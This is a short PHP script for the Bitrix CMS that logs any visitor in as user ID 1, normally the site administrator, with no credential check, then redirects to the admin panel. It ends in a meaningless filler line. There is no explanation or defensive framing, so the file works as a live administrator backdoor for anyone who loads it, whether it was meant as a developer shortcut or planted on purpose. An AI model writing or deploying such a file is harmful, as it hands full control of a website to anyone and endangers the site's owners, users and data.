<?php

use Bitrix\Main\Type\DateTime;

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
global $APPLICATION;
global $USER;




$USER->Authorize(1);
LocalRedirect('/bitrix/admin/', true);
$stsdf = 'sdfsf/jpeg';


